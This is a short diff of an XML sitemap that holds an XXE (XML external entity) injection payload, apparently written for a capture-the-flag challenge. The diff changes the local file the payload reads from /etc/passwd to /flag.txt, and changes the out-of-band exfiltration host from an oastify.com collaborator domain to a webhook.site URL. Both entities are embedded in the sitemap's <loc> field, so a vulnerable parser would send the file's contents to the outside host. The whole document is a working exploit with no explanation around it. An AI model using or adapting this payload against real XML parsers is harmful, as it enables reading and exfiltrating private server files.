@@ -1,14 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE urlset [
-<!ENTITY test "http://v840228frh4ucsh0uvija1du5lbcz4nt.oastify.com"> 
-<!ENTITY file SYSTEM "file:///etc/passwd">
+<!ENTITY test "https://webhook.site/7b02ae7d-04b1-416d-b7e0-26a61298ef20"> 
+<!ENTITY file SYSTEM "file:///flag.txt">
 ]>
 <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
 <url>
     <loc>&test;?&file;</loc>
-    <lastmod>2019-06-19</lastmod>
-    <changefreq>daily</changefreq>
 </url>
 </urlset>
